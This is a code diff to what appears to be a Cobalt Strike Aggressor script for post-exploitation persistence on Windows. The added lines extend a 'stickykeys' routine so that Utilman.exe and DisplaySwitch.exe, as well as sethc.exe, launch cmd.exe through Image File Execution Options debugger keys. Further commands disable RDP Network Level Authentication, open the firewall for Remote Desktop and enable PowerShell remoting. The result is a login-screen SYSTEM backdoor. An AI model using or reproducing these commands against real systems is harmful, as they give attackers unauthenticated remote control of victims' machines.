@@ -12,16 +12,20 @@
 ########################################
 
 sub stickykeys {
-    binput($1, 'stickykeys');
+    binput($1, 'Running setup for StickyKeys');
     bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
     bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f');
     bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d "0" /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f');
     bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
     bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
     bshell($1, 'net start TermService');
 
-    binput($1, 'enable WinRM');
+    binput($1, 'Running setup for PSRemoting');
     bpowershell($1, 'Enable-PSRemoting -Force');
+       
 }
 sub persist_adsvc {
     if (-exists script_resource("adsvc.exe")) {
